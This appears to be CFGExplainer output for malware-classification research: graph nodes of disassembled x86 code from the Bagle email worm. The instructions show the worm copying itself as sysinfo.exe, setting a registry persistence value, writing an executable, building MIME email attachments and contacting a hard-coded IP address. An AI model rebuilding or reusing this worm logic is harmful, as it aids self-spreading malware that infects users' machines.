@@ -1,0 +1,6712 @@
+CFGExplainer result: [malware = Bagle |  graph = Email-Worm.Win32.Bagle.t| #nodes = 517]
+
+node :1
+node sub_402782(4204496) info:
+ start: 4204496
+ prev: []
+ instructions: 
+  4204496, ['push', '[ebp+var_C];cp']
+  4204499, ['push', '[ebp+var_8];int']
+  4204502, ['push', '[ebp+hMem];int']
+  4204505, ['call', 'sub_4021D1']
+  4204510, ['test', 'eax,eax']
+  4204512, ['jnz', 'shortloc_4027E5']
+ next: [4204514, 4204517]
+
+node :2
+node sub_402782(4204514) info:
+ start: 4204514
+ prev: []
+ instructions: 
+  4204514, ['dec', 'edi']
+  4204515, ['jg', 'shortloc_4027D0']
+ next: [4204496, 4204517]
+
+node :3
+node sub_402782(4204451) info:
+ start: 4204451
+ prev: []
+ instructions: 
+  4204451, ['push', 'dwordptr[ecx]']
+  4204453, ['pop', '[ebp+hMem]']
+  4204456, ['push', 'dwordptr[ecx+4]']
+  4204459, ['pop', '[ebp+var_8]']
+  4204462, ['push', 'dwordptr[ecx+0Ch]']
+  4204465, ['pop', '[ebp+var_C]']
+  4204468, ['push', 'dwordptr[ecx+8]']
+  4204471, ['pop', 'dwordptr[ebx+4]']
+  4204474, ['push', 'ecx;hMem']
+  4204475, ['call', 'GlobalFree']
+  4204480, ['push', 'hMutex;hMutex']
+  4204486, ['call', 'ReleaseMutex']
+  4204491, ['mov', 'edi,1']
+ next: [4204496]
+
+node :4
+node sub_402140(4202869) info:
+ start: 4202869
+ prev: []
+ instructions: 
+  4202869, ['push', '[ebp+arg_4]']
+  4202872, ['call', 'sub_401486']
+  4202877, ['push', 'ebx;lpString']
+  4202878, ['call', 'lstrlenA']
+  4202883, ['mov', 'edx,[ebp+arg_4]']
+  4202886, ['mov', 'edx,[edx]']
+  4202888, ['push', '0']
+  4202890, ['push', 'eax']
+  4202891, ['push', 'ebx']
+  4202892, ['push', '[ebp+arg_4]']
+  4202895, ['call', 'dwordptr[edx+10h]']
+  4202898, ['push', '14h']
+  4202900, ['lea', 'eax,[ebp+String2]']
+  4202903, ['push', 'eax']
+  4202904, ['call', 'sub_401000']
+  4202909, ['push', '9']
+  4202911, ['call', 'sub_4012AF']
+  4202916, ['add', 'eax,3']
+  4202919, ['push', 'eax']
+  4202920, ['lea', 'eax,[ebp+String2]']
+  4202923, ['push', 'eax']
+  4202924, ['call', 'sub_401023']
+  4202929, ['lea', 'eax,[ebp+String2]']
+  4202932, ['push', 'eax;lpString2']
+  4202933, ['push', 'offseta555;"[%555%]"']
+  4202938, ['push', 'ebx;lpString']
+  4202939, ['call', 'sub_401063']
+  4202944, ['push', 'eax']
+  4202945, ['push', 'ebx;hMem']
+  4202946, ['call', 'GlobalFree']
+  4202951, ['pop', 'ebx']
+  4202952, ['test', 'ebx,ebx']
+  4202954, ['jnz', 'shortloc_402175']
+ next: [4202956, 4202869]
+
+node :5
+node sub_40246F(4203652) info:
+ start: 4203652
+ prev: []
+ instructions: 
+  4203652, ['inc', 'eax']
+  4203653, ['push', 'eax;lpString']
+  4203654, ['call', 'sub_4020BB']
+  4203659, ['mov', 'esi,eax']
+  4203661, ['or', 'eax,eax']
+  4203663, ['jz', 'shortloc_4024A3']
+ next: [4203665, 4203683]
+
+node :6
+node sub_4021D1(4202961) info:
+ start: 4202961
+ prev: []
+ instructions: 
+  4202961, ['push', 'ebp']
+  4202962, ['mov', 'ebp,esp']
+  4202964, ['add', 'esp,0FFFFFFECh']
+  4202967, ['push', 'esi']
+  4202968, ['push', 'edi']
+  4202969, ['push', 'ebx']
+  4202970, ['xor', 'edi,edi']
+  4202972, ['push', '[ebp+arg_0]']
+  4202975, ['push', '[ebp+arg_4]']
+  4202978, ['call', 'sub_40260B']
+  4202983, ['mov', '[ebp+var_C],eax']
+  4202986, ['lea', 'eax,[ebp+ppstm]']
+  4202989, ['push', 'eax;ppstm']
+  4202990, ['call', 'sub_4013D7']
+  4202995, ['push', '[ebp+ppstm]']
+  4202998, ['push', '[ebp+var_C]']
+  4203001, ['call', 'sub_402140']
+  4203006, ['push', '2000h;dwBytes']
+  4203011, ['push', '40h;uFlags']
+  4203013, ['call', 'GlobalAlloc']
+  4203018, ['mov', '[ebp+buf],eax']
+  4203021, ['lea', 'eax,[ebp+var_4]']
+  4203024, ['push', 'eax;ppstm']
+  4203025, ['call', 'sub_4013D7']
+  4203030, ['mov', 'ecx,19h']
+  4203035, ['xchg', 'cl,ch']
+  4203037, ['push', 'ecx;int']
+  4203038, ['push', '0;int']
+  4203040, ['push', '[ebp+cp];cp']
+  4203043, ['call', 'sub_401B2A']
+  4203048, ['test', 'eax,eax']
+  4203050, ['jz', 'loc_402446']
+ next: [4203056, 4203590]
+
+node :7
+node sub_4012AF(4199195) info:
+ start: 4199195
+ prev: []
+ instructions: 
+  4199195, ['mov', '[esi],eax']
+  4199197, ['add', 'esi,4']
+  4199200, ['inc', '[ebp+var_4]']
+  4199203, ['cmp', '[ebp+var_4],0E3h']
+  4199210, ['jnz', 'shortloc_4012ED']
+ next: [4199149, 4199212]
+
+node :8
+node sub_40260B(4204043) info:
+ start: 4204043
+ prev: []
+ instructions: 
+  4204043, ['push', 'ebp']
+  4204044, ['mov', 'ebp,esp']
+  4204046, ['add', 'esp,0FFFFFFD8h']
+  4204049, ['lea', 'eax,[ebp+ppstm]']
+  4204052, ['push', 'eax;ppstm']
+  4204053, ['call', 'sub_4013D7']
+  4204058, ['push', '800h;dwBytes']
+  4204063, ['push', '40h;uFlags']
+  4204065, ['call', 'GlobalAlloc']
+  4204070, ['mov', '[ebp+lpString],eax']
+  4204073, ['push', '1Eh']
+  4204075, ['lea', 'eax,[ebp+var_22]']
+  4204078, ['push', 'eax']
+  4204079, ['call', 'sub_401000']
+  4204084, ['push', '0Fh']
+  4204086, ['lea', 'eax,[ebp+var_22]']
+  4204089, ['push', 'eax']
+  4204090, ['call', 'sub_401043']
+  4204095, ['push', '[ebp+lpString];LPSTR']
+  4204098, ['lea', 'eax,[ebp+var_22]']
+  4204101, ['push', 'eax;int']
+  4204102, ['push', '[ebp+arg_0];int']
+  4204105, ['push', '[ebp+arg_4];int']
+  4204108, ['call', 'sub_4025AF']
+  4204113, ['push', '[ebp+lpString];lpString']
+  4204116, ['call', 'lstrlenA']
+  4204121, ['mov', 'edx,[ebp+ppstm]']
+  4204124, ['mov', 'edx,[edx]']
+  4204126, ['push', '0']
+  4204128, ['push', 'eax']
+  4204129, ['push', '[ebp+lpString]']
+  4204132, ['push', '[ebp+ppstm]']
+  4204135, ['call', 'dwordptr[edx+10h]']
+  4204138, ['lea', 'eax,[ebp+var_22]']
+  4204141, ['push', 'eax']
+  4204142, ['push', 'offsetaSContentTypeTe;"----------%s\\r\\nContent-Type:text/plai"...']
+  4204147, ['push', '[ebp+lpString];LPSTR']
+  4204150, ['call', 'wsprintfA']
+  4204155, ['add', 'esp,0Ch']
+  4204158, ['push', '[ebp+lpString];lpString']
+  4204161, ['call', 'lstrlenA']
+  4204166, ['mov', 'edx,[ebp+ppstm]']
+  4204169, ['mov', 'edx,[edx]']
+  4204171, ['push', '0']
+  4204173, ['push', 'eax']
+  4204174, ['push', '[ebp+lpString]']
+  4204177, ['push', '[ebp+ppstm]']
+  4204180, ['call', 'dwordptr[edx+10h]']
+  4204183, ['mov', 'edx,[ebp+ppstm]']
+  4204186, ['mov', 'edx,[edx]']
+  4204188, ['push', '0']
+  4204190, ['push', '4']
+  4204192, ['push', 'offsetbyte_4052A3']
+  4204197, ['push', '[ebp+ppstm]']
+  4204200, ['call', 'dwordptr[edx+10h]']
+  4204203, ['mov', 'edx,[ebp+ppstm]']
+  4204206, ['mov', 'edx,[edx]']
+  4204208, ['push', '0']
+  4204210, ['push', '2']
+  4204212, ['push', 'offsetasc_4053F9;"\\r\\n\\\\"']
+  4204217, ['push', '[ebp+ppstm]']
+  4204220, ['call', 'dwordptr[edx+10h]']
+  4204223, ['lea', 'eax,[ebp+var_22]']
+  4204226, ['push', 'eax']
+  4204227, ['push', 'offsetaSContentTypeAp;"----------%s\\r\\nContent-Type:applicati"...']
+  4204232, ['push', '[ebp+lpString];LPSTR']
+  4204235, ['call', 'wsprintfA']
+  4204240, ['add', 'esp,0Ch']
+  4204243, ['push', '[ebp+lpString];lpString']
+  4204246, ['call', 'lstrlenA']
+  4204251, ['mov', 'edx,[ebp+ppstm]']
+  4204254, ['mov', 'edx,[edx]']
+  4204256, ['push', '0']
+  4204258, ['push', 'eax']
+  4204259, ['push', '[ebp+lpString]']
+  4204262, ['push', '[ebp+ppstm]']
+  4204265, ['call', 'dwordptr[edx+10h]']
+  4204268, ['mov', 'edx,[ebp+ppstm]']
+  4204271, ['mov', 'edx,[edx]']
+  4204273, ['push', '0']
+  4204275, ['push', 'dword_407B28']
+  4204281, ['push', 'lpString']
+  4204287, ['push', '[ebp+ppstm]']
+  4204290, ['call', 'dwordptr[edx+10h]']
+  4204293, ['lea', 'eax,[ebp+var_22]']
+  4204296, ['push', 'eax']
+  4204297, ['push', 'offsetaS_;"\\r\\n\\r\\n----------%s--\\r\\n\\r\\n.\\r\\n"']
+  4204302, ['push', '[ebp+lpString];LPSTR']
+  4204305, ['call', 'wsprintfA']
+  4204310, ['add', 'esp,0Ch']
+  4204313, ['push', '[ebp+lpString];lpString']
+  4204316, ['call', 'lstrlenA']
+  4204321, ['mov', 'edx,[ebp+ppstm]']
+  4204324, ['mov', 'edx,[edx]']
+  4204326, ['push', '0']
+  4204328, ['push', 'eax']
+  4204329, ['push', '[ebp+lpString]']
+  4204332, ['push', '[ebp+ppstm]']
+  4204335, ['call', 'dwordptr[edx+10h]']
+  4204338, ['push', '[ebp+lpString];hMem']
+  4204341, ['call', 'GlobalFree']
+  4204346, ['mov', 'eax,[ebp+ppstm]']
+  4204349, ['leave']
+  4204350, ['retn', '8']
+ next: []
+
+node :9
+node sub_4012AF(4199149) info:
+ start: 4199149
+ prev: []
+ instructions: 
+  4199149, ['mov', 'eax,[esi]']
+  4199151, ['and', 'eax,80000000h']
+  4199156, ['mov', 'ebx,[esi+4]']
+  4199159, ['and', 'ebx,7FFFFFFFh']
+  4199165, ['or', 'eax,ebx']
+  4199167, ['mov', 'ecx,eax']
+  4199169, ['shr', 'eax,1']
+  4199171, ['mov', 'edx,esi']
+  4199173, ['add', 'edx,634h']
+  4199179, ['mov', 'ebx,[edx]']
+  4199181, ['xor', 'eax,ebx']
+  4199183, ['and', 'ecx,1']
+  4199186, ['or', 'ecx,ecx']
+  4199188, ['jz', 'shortloc_40131B']
+ next: [4199190, 4199195]
+
+node :10
+node sub_4012AF(4199118) info:
+ start: 4199118
+ prev: []
+ instructions: 
+  4199118, ['cmp', 'dword_4052D9,271h']
+  4199128, ['jnz', 'shortloc_4012E4']
+ next: [4199130, 4199140]
+
+node :11
+node sub_40183A(4200531) info:
+ start: 4200531
+ prev: []
+ instructions: 
+  4200531, ['call', 'GetTickCount']
+  4200536, ['push', 'eax']
+  4200537, ['call', 'sub_401274']
+  4200542, ['call', 'sub_4015AA']
+  4200547, ['lea', 'eax,[ebp+WSAData]']
+  4200553, ['push', 'eax;lpWSAData']
+  4200554, ['push', '101h;wVersionRequested']
+  4200559, ['call', 'WSAStartup']
+  4200564, ['call', 'sub_402AE7']
+  4200569, ['push', '0;lpName']
+  4200571, ['push', '0;bInitialOwner']
+  4200573, ['push', '0;lpMutexAttributes']
+  4200575, ['call', 'CreateMutexA']
+  4200580, ['mov', 'hHandle,eax']
+  4200585, ['call', 'sub_402741']
+  4200590, ['call', 'sub_4016CF']
+  4200595, ['push', '104h;uSize']
+  4200600, ['push', 'offsetNewFileName;lpBuffer']
+  4200605, ['call', 'GetSystemDirectoryA']
+  4200610, ['push', '104h;nSize']
+  4200615, ['push', 'offsetExistingFileName;lpFilename']
+  4200620, ['push', '0;hModule']
+  4200622, ['call', 'GetModuleFileNameA']
+  4200627, ['push', 'offsetaSysinfo_exe_0;"\\\\sysinfo.exe"']
+  4200632, ['push', 'offsetNewFileName;lpString1']
+  4200637, ['call', 'lstrcatA']
+  4200642, ['call', 'sub_40162A']
+  4200647, ['push', 'offsetNewFileName']
+  4200652, ['push', 'offsetExistingFileName']
+  4200657, ['call', 'StrStrIA']
+  4200662, ['or', 'eax,eax']
+  4200664, ['jnz', 'shortloc_401924']
+ next: [4200666, 4200740]
+
+node :12
+node sub_402B36(4205385) info:
+ start: 4205385
+ prev: []
+ instructions: 
+  4205385, ['push', '[ebp+lpString2];lpString']
+  4205388, ['call', 'sub_4014F8']
+  4205393, ['push', 'eax']
+  4205394, ['push', '1388h']
+  4205399, ['push', 'offsetword_407D6E']
+  4205404, ['call', 'sub_401543']
+  4205409, ['or', 'eax,eax']
+  4205411, ['jz', 'shortlocret_402B95']
+ next: [4205413, 4205461]
+
+node :13
+node start(4206996) info:
+ start: 4206996
+ prev: []
+ instructions: 
+  4206996, ['push', '0;pvReserved']
+  4206998, ['call', 'CoInitialize']
+  4207003, ['call', 'sub_40183A']
+  4207008, ['cmp', 'dword_40500F,0']
+  4207015, ['jnz', 'shortloc_4031C2']
+ next: [4207017, 4207042]
+
+node :14
+node sub_4020BB(4202683) info:
+ start: 4202683
+ prev: []
+ instructions: 
+  4202683, ['push', 'ebp']
+  4202684, ['mov', 'ebp,esp']
+  4202686, ['add', 'esp,0FFFFFFFCh']
+  4202689, ['cmp', 'byte_405377,0']
+  4202696, ['jnz', 'shortloc_4020D6']
+ next: [4202698, 4202710]
+
+node :15
+node sub_4012AF(4199140) info:
+ start: 4199140
+ prev: []
+ instructions: 
+  4199140, ['mov', '[ebp+var_4],0']
+  4199147, ['mov', 'esi,edi']
+ next: [4199149]
+
+node :16
+node sub_402140(4202816) info:
+ start: 4202816
+ prev: []
+ instructions: 
+  4202816, ['push', 'ebp']
+  4202817, ['mov', 'ebp,esp']
+  4202819, ['add', 'esp,0FFFFFFECh']
+  4202822, ['push', 'ebx']
+  4202823, ['push', '[ebp+arg_0]']
+  4202826, ['call', 'sub_40142B']
+  4202831, ['push', 'eax']
+  4202832, ['add', 'eax,4']
+  4202835, ['push', 'eax;dwBytes']
+  4202836, ['push', '40h;uFlags']
+  4202838, ['call', 'GlobalAlloc']
+  4202843, ['mov', 'ebx,eax']
+  4202845, ['push', '[ebp+arg_0]']
+  4202848, ['call', 'sub_401473']
+  4202853, ['pop', 'eax']
+  4202854, ['mov', 'edx,[ebp+arg_0]']
+  4202857, ['mov', 'edx,[edx]']
+  4202859, ['push', '0']
+  4202861, ['push', 'eax']
+  4202862, ['push', 'ebx']
+  4202863, ['push', '[ebp+arg_0]']
+  4202866, ['call', 'dwordptr[edx+0Ch]']
+ next: [4202869]
+
+node :17
+node sub_4012AF(4199130) info:
+ start: 4199130
+ prev: []
+ instructions: 
+  4199130, ['push', '1105h']
+  4199135, ['call', 'sub_401274']
+ next: [4199140]
+
+node :18
+node sub_402782(4204431) info:
+ start: 4204431
+ prev: []
+ instructions: 
+  4204431, ['push', '0FFFFFFFFh;dwMilliseconds']
+  4204433, ['push', 'hMutex;hHandle']
+  4204439, ['call', 'WaitForSingleObject']
+  4204444, ['mov', 'ecx,[ebx+4]']
+  4204447, ['or', 'ecx,ecx']
+  4204449, ['jz', 'shortloc_4027FF']
+ next: [4204451, 4204543]
+
+node :19
+node sub_4025AF(4203951) info:
+ start: 4203951
+ prev: []
+ instructions: 
+  4203951, ['push', 'ebp']
+  4203952, ['mov', 'ebp,esp']
+  4203954, ['add', 'esp,0FFFFFFB0h']
+  4203957, ['push', '14h']
+  4203959, ['lea', 'eax,[ebp+var_1E]']
+  4203962, ['push', 'eax']
+  4203963, ['call', 'sub_401000']
+  4203968, ['push', '13h']
+  4203970, ['lea', 'eax,[ebp+var_1E]']
+  4203973, ['push', 'eax']
+  4203974, ['call', 'sub_401023']
+  4203979, ['lea', 'eax,[ebp+String1]']
+  4203982, ['push', 'eax;lpString1']
+  4203983, ['call', 'sub_402506']
+  4203988, ['push', '40h']
+  4203990, ['push', '0']
+  4203992, ['push', '[ebp+arg_4]']
+  4203995, ['call', 'StrRChrA']
+  4204000, ['or', 'eax,eax']
+  4204002, ['jz', 'shortlocret_402607']
+ next: [4204004, 4204039]
+
+node :20
+node sub_402E35(4206533) info:
+ start: 4206533
+ prev: []
+ instructions: 
+  4206533, ['push', '[ebp+arg_4]']
+  4206536, ['call', 'sub_401473']
+  4206541, ['push', '104h;uSize']
+  4206546, ['lea', 'eax,[ebp+String1]']
+  4206552, ['push', 'eax;lpBuffer']
+  4206553, ['call', 'GetWindowsDirectoryA']
+  4206558, ['push', '5']
+  4206560, ['lea', 'eax,[ebp+String2]']
+  4206566, ['push', 'eax']
+  4206567, ['call', 'sub_401023']
+  4206572, ['push', 'offsetaBsud;"\\\\bsud"']
+  4206577, ['lea', 'eax,[ebp+String1]']
+  4206583, ['push', 'eax;lpString1']
+  4206584, ['call', 'lstrcatA']
+  4206589, ['lea', 'eax,[ebp+String2]']
+  4206595, ['push', 'eax;lpString2']
+  4206596, ['lea', 'eax,[ebp+String1]']
+  4206602, ['push', 'eax;lpString1']
+  4206603, ['call', 'lstrcatA']
+  4206608, ['push', 'offseta_exe;".exe"']
+  4206613, ['lea', 'eax,[ebp+String1]']
+  4206619, ['push', 'eax;lpString1']
+  4206620, ['call', 'lstrcatA']
+  4206625, ['push', '0;hTemplateFile']
+  4206627, ['push', '0;dwFlagsAndAttributes']
+  4206629, ['push', '2;dwCreationDisposition']
+  4206631, ['push', '0;lpSecurityAttributes']
+  4206633, ['push', '2;dwShareMode']
+  4206635, ['push', '40000000h;dwDesiredAccess']
+  4206640, ['lea', 'eax,[ebp+String1]']
+  4206646, ['push', 'eax;lpFileName']
+  4206647, ['call', 'CreateFileA']
+  4206652, ['mov', '[ebp+hFile],eax']
+  4206658, ['inc', 'eax']
+  4206659, ['jz', 'loc_4030E4']
+ next: [4206665, 4206820]
+
+node :21
+node sub_402B36(4205413) info:
+ start: 4205413
+ prev: []
+ instructions: 
+  4205413, ['cmp', 'byte_407D72,0']
+  4205420, ['jnz', 'shortloc_402B7B']
+ next: [4205422, 4205435]
+
+node :22
+node sub_4012AF(4199212) info:
+ start: 4199212
+ prev: []
+ instructions: 
+  4199212, ['mov', 'eax,[esi]']
+  4199214, ['and', 'eax,80000000h']
+  4199219, ['mov', 'ebx,[esi+4]']
+  4199222, ['and', 'ebx,7FFFFFFFh']
+  4199228, ['or', 'eax,ebx']
+  4199230, ['mov', 'ecx,eax']
+  4199232, ['shr', 'eax,1']
+  4199234, ['mov', 'edx,esi']
+  4199236, ['add', 'edx,0FFFFFC74h']
+  4199242, ['mov', 'ebx,[edx]']
+  4199244, ['xor', 'eax,ebx']
+  4199246, ['and', 'ecx,1']
+  4199249, ['or', 'ecx,ecx']
+  4199251, ['jz', 'shortloc_40135A']
+ next: [4199253, 4199258]
+
+node :23
+node sub_4010DD(4198669) info:
+ start: 4198669
+ prev: []
+ instructions: 
+  4198669, ['inc', 'ebx']
+  4198670, ['jmp', 'shortloc_401112']
+ next: [4198674]
+
+node :24
+node sub_4010DD(4198656) info:
+ start: 4198656
+ prev: []
+ instructions: 
+  4198656, ['shl', 'eax,8']
+  4198659, ['inc', 'ebx']
+  4198660, ['inc', 'ebx']
+  4198661, ['jmp', 'shortloc_401112']
+ next: [4198674]
+
+node :25
+node sub_4010DD(4198672) info:
+ start: 4198672
+ prev: []
+ instructions: 
+  4198672, ['lodsb']
+  4198673, ['dec', 'ecx']
+ next: [4198674]
+
+node :26
+node sub_4010DD(4198663) info:
+ start: 4198663
+ prev: []
+ instructions: 
+  4198663, ['lodsb']
+  4198664, ['shl', 'eax,8']
+  4198667, ['loop', 'loc_401110']
+ next: [4198669, 4198672]
+
+node :27
+node sub_4012AF(4199258) info:
+ start: 4199258
+ prev: []
+ instructions: 
+  4199258, ['mov', '[esi],eax']
+  4199260, ['add', 'esi,4']
+  4199263, ['inc', '[ebp+var_4]']
+  4199266, ['cmp', '[ebp+var_4],26Fh']
+  4199273, ['jnz', 'shortloc_40132C']
+ next: [4199212, 4199275]
+
+node :28
+node sub_402DF7(4206074) info:
+ start: 4206074
+ prev: []
+ instructions: 
+  4206074, ['call', 'sub_402DCC']
+  4206079, ['push', '5F5E100h;dwMilliseconds']
+  4206084, ['call', 'Sleep']
+  4206089, ['jmp', 'shortloc_402DFA']
+ next: [4206074]
+
+node :29
+node sub_4012AF(4199190) info:
+ start: 4199190
+ prev: []
+ instructions: 
+  4199190, ['xor', 'eax,9908B0DFh']
+ next: [4199195]
+
+node :30
+node sub_4014F8(4199696) info:
+ start: 4199696
+ prev: []
+ instructions: 
+  4199696, ['mov', 'ebx,edx']
+  4199698, ['shl', 'edx,5']
+  4199701, ['shr', 'ebx,1Bh']
+  4199704, ['or', 'edx,ebx']
+  4199706, ['movzx', 'ebx,byteptr[eax]']
+  4199709, ['inc', 'eax']
+  4199710, ['add', 'edx,ebx']
+  4199712, ['loop', 'loc_401510']
+ next: [4199714, 4199696]
+
+node :31
+node sub_4014F8(4199672) info:
+ start: 4199672
+ prev: []
+ instructions: 
+  4199672, ['push', 'ebp']
+  4199673, ['mov', 'ebp,esp']
+  4199675, ['push', 'ebx']
+  4199676, ['push', '[ebp+lpString];lpString']
+  4199679, ['call', 'lstrlenA']
+  4199684, ['mov', 'ecx,eax']
+  4199686, ['mov', 'edx,0F1E2D3C4h']
+  4199691, ['jecxz', 'shortloc_401522']
+ next: [4199693, 4199714]
+
+node :32
+node sub_4014F8(4199693) info:
+ start: 4199693
+ prev: []
+ instructions: 
+  4199693, ['mov', 'eax,[ebp+lpString]']
+ next: [4199696]
+
+node :33
+node sub_403100(4206935) info:
+ start: 4206935
+ prev: []
+ instructions: 
+  4206935, ['cmp', 'byteptr[esi+1],0FFh']
+  4206939, ['jnz', 'shortloc_403171']
+ next: [4206941, 4206961]
+
+node :34
+node sub_401E1F(4202141) info:
+ start: 4202141
+ prev: []
+ instructions: 
+  4202141, ['push', '[ebp+arg_0]']
+  4202144, ['call', 'sub_401486']
+  4202149, ['push', '0;int']
+  4202151, ['push', '4;int']
+  4202153, ['push', '2;int']
+  4202155, ['push', '[ebp+arg_0];int']
+  4202158, ['push', 'ebx;s']
+  4202159, ['call', 'sub_4019D4']
+  4202164, ['test', 'eax,eax']
+  4202166, ['jz', 'shortloc_401F24']
+ next: [4202168, 4202276]
+
+node :35
+node sub_401043(4198478) info:
+ start: 4198478
+ prev: []
+ instructions: 
+  4198478, ['push', '9']
+  4198480, ['call', 'sub_4012AF']
+  4198485, ['add', 'eax,30h']
+  4198488, ['cld']
+  4198489, ['stosb']
+  4198490, ['dec', 'ebx']
+  4198491, ['jnz', 'shortloc_40104E']
+ next: [4198493, 4198478]
+
+node :36
+node sub_401023(4198446) info:
+ start: 4198446
+ prev: []
+ instructions: 
+  4198446, ['push', '19h']
+  4198448, ['call', 'sub_4012AF']
+  4198453, ['add', 'eax,61h']
+  4198456, ['cld']
+  4198457, ['stosb']
+  4198458, ['dec', 'ebx']
+  4198459, ['jnz', 'shortloc_40102E']
+ next: [4198461, 4198446]
+
+node :37
+node sub_4015AA(4199926) info:
+ start: 4199926
+ prev: []
+ instructions: 
+  4199926, ['push', '9']
+  4199928, ['call', 'sub_4012AF']
+  4199933, ['add', 'eax,31h']
+  4199936, ['mov', '[edi],al']
+  4199938, ['inc', 'edi']
+  4199939, ['dec', 'esi']
+  4199940, ['jnz', 'shortloc_4015F6']
+ next: [4199942, 4199926]
+
+node :38
+node sub_4020BB(4202710) info:
+ start: 4202710
+ prev: []
+ instructions: 
+  4202710, ['lea', 'eax,[ebp+ppstm]']
+  4202713, ['push', 'eax;ppstm']
+  4202714, ['call', 'sub_4013D7']
+  4202719, ['push', '[ebp+lpString];lpString']
+  4202722, ['push', '[ebp+ppstm];int']
+  4202725, ['call', 'sub_401D31']
+  4202730, ['push', 'offsetcp;"217.5.97.137"']
+  4202735, ['push', '[ebp+ppstm];int']
+  4202738, ['call', 'sub_401E1F']
+  4202743, ['push', 'eax']
+  4202744, ['push', '[ebp+ppstm]']
+  4202747, ['call', 'sub_4013EA']
+  4202752, ['pop', 'eax']
+  4202753, ['leave']
+  4202754, ['retn', '4']
+ next: []
+
+node :39
+node sub_4010DD(4198679) info:
+ start: 4198679
+ prev: []
+ instructions: 
+  4198679, ['rol', 'edx,8']
+  4198682, ['mov', 'dl,al']
+  4198684, ['and', 'dl,3Fh']
+  4198687, ['shr', 'eax,6']
+  4198690, ['loop', 'loc_401117']
+ next: [4198692, 4198679]
+
+node :40
+node sub_401043(4198467) info:
+ start: 4198467
+ prev: []
+ instructions: 
+  4198467, ['push', 'ebp']
+  4198468, ['mov', 'ebp,esp']
+  4198470, ['push', 'edi']
+  4198471, ['push', 'ebx']
+  4198472, ['mov', 'ebx,[ebp+arg_4]']
+  4198475, ['mov', 'edi,[ebp+arg_0]']
+ next: [4198478]
+
+node :41
+node sub_401023(4198435) info:
+ start: 4198435
+ prev: []
+ instructions: 
+  4198435, ['push', 'ebp']
+  4198436, ['mov', 'ebp,esp']
+  4198438, ['push', 'edi']
+  4198439, ['push', 'ebx']
+  4198440, ['mov', 'ebx,[ebp+arg_4]']
+  4198443, ['mov', 'edi,[ebp+arg_0]']
+ next: [4198446]
+
+node :42
+node sub_4015AA(4199916) info:
+ start: 4199916
+ prev: []
+ instructions: 
+  4199916, ['mov', 'edi,offsetData']
+  4199921, ['mov', 'esi,9']
+ next: [4199926]
+
+node :43
+node sub_4010DD(4198674) info:
+ start: 4198674
+ prev: []
+ instructions: 
+  4198674, ['push', 'ecx']
+  4198675, ['push', '4']
+  4198677, ['pop', 'ecx']
+  4198678, ['push', 'ecx']
+ next: [4198679]
+
+node :44
+node sub_40183A(4200506) info:
+ start: 4200506
+ prev: []
+ instructions: 
+  4200506, ['push', 'ebp']
+  4200507, ['mov', 'ebp,esp']
+  4200509, ['add', 'esp,0FFFFFE70h']
+  4200515, ['call', 'sub_40166E']
+  4200520, ['or', 'eax,eax']
+  4200522, ['jnz', 'shortloc_401853']
+ next: [4200524, 4200531]
+
+node :45
+node sub_401FB9(4202577) info:
+ start: 4202577
+ prev: []
+ instructions: 
+  4202577, ['push', '[ebp+lpString2];lpString']
+  4202580, ['push', 'esi;int']
+  4202581, ['push', '[ebp+hMem];int']
+  4202584, ['call', 'sub_401F86']
+  4202589, ['mov', 'esi,eax']
+  4202591, ['lodsd']
+  4202592, ['push', 'eax']
+  4202593, ['lodsd']
+  4202594, ['xor', 'eax,eax']
+  4202596, ['lodsw']
+  4202598, ['pop', 'edx']
+  4202599, ['cmp', 'edx,1000F00h']
+  4202605, ['jz', 'shortloc_402075']
+ next: [4202607, 4202613]
+
+node :46
+node sub_402BD5(4205650) info:
+ start: 4205650
+ prev: []
+ instructions: 
+  4205650, ['push', '(offsetasc_4053F9+2);lpString2']
+  4205655, ['push', '[ebp+lpString];lpString1']
+  4205658, ['call', 'lstrcatA']
+  4205663, ['push', '[ebp+arg_4];int']
+  4205666, ['push', '[ebp+lpString];lpString']
+  4205669, ['call', 'sub_402BD5']
+  4205674, ['jmp', 'shortloc_402C74']
+ next: [4205684]
+
+node :47
+node sub_4015AA(4199850) info:
+ start: 4199850
+ prev: []
+ instructions: 
+  4199850, ['push', 'ebp']
+  4199851, ['mov', 'ebp,esp']
+  4199853, ['add', 'esp,0FFFFFFF4h']
+  4199856, ['push', 'esi']
+  4199857, ['push', 'edi']
+  4199858, ['lea', 'eax,[ebp+phkResult]']
+  4199861, ['push', 'eax;phkResult']
+  4199862, ['push', 'offsetSubKey;"SOFTWARE\\\\Windows2005"']
+  4199867, ['push', '80000001h;hKey']
+  4199872, ['call', 'RegCreateKeyA']
+  4199877, ['mov', '[ebp+cbData],9']
+  4199884, ['lea', 'eax,[ebp+cbData]']
+  4199887, ['push', 'eax;lpcbData']
+  4199888, ['push', 'offsetData;lpData']
+  4199893, ['lea', 'eax,[ebp+Type]']
+  4199896, ['push', 'eax;lpType']
+  4199897, ['push', '0;lpReserved']
+  4199899, ['push', 'offsetValueName;"gsed"']
+  4199904, ['push', '[ebp+phkResult];hKey']
+  4199907, ['call', 'RegQueryValueExA']
+  4199912, ['test', 'eax,eax']
+  4199914, ['jz', 'shortloc_40161E']
+ next: [4199916, 4199966]
+
+node :48
+node sub_401E1F(4202233) info:
+ start: 4202233
+ prev: []
+ instructions: 
+  4202233, ['push', 'ebx;s']
+  4202234, ['call', 'closesocket']
+  4202239, ['push', '[ebp+arg_0]']
+  4202242, ['call', 'sub_401FB9']
+  4202247, ['mov', 'ebx,eax']
+  4202249, ['push', 'eax;lpString']
+  4202250, ['call', 'lstrlenA']
+  4202255, ['or', 'eax,eax']
+  4202257, ['jnz', 'shortloc_401F1D']
+ next: [4202259, 4202269]
+
+node :49
+node sub_402E35(4206466) info:
+ start: 4206466
+ prev: []
+ instructions: 
+  4206466, ['push', '[ebp+arg_4]']
+  4206469, ['call', 'sub_401473']
+  4206474, ['mov', 'edx,[ebp+arg_4]']
+  4206477, ['mov', 'edx,[edx]']
+  4206479, ['push', '0']
+  4206481, ['push', '4']
+  4206483, ['lea', 'eax,[ebp+var_158]']
+  4206489, ['push', 'eax']
+  4206490, ['push', '[ebp+arg_4]']
+  4206493, ['call', 'dwordptr[edx+0Ch]']
+  4206496, ['push', '[ebp+arg_4]']
+  4206499, ['call', 'sub_401486']
+  4206504, ['push', '0;int']
+  4206506, ['push', '4;int']
+  4206508, ['push', '[ebp+var_158];int']
+  4206514, ['push', '[ebp+arg_4];int']
+  4206517, ['push', '[ebp+s];s']
+  4206520, ['call', 'sub_4019D4']
+  4206525, ['test', 'eax,eax']
+  4206527, ['jz', 'loc_4030E4']
+ next: [4206533, 4206820]
+
+node :50
